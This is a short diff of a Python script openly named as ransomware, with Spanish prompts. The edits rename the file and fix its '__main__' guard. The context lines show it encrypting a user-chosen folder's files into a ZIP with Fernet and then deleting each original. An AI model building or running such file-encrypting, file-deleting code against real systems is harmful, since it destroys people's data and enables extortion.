@@ -1,5 +1,4 @@
-# ransomware_encrypt.py
-
+# ransomware_encrypt_zip.py
 import os
 import zipfile
 from cryptography.fernet import Fernet
@@ -35,7 +34,7 @@ def encrypt_files_to_zip(folder, zip_filename):
                 # Borra el archivo original después de cifrar
                 os.remove(file_path)
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     folder_to_encrypt = input("Ingresa la dirección de la carpeta que quieres encriptar: ")
     zip_filename = input("Ingresa el nombre del archivo ZIP a crear (ejemplo: archivos_cifrados.zip): ")
     encrypt_files_to_zip(folder_to_encrypt, zip_filename)
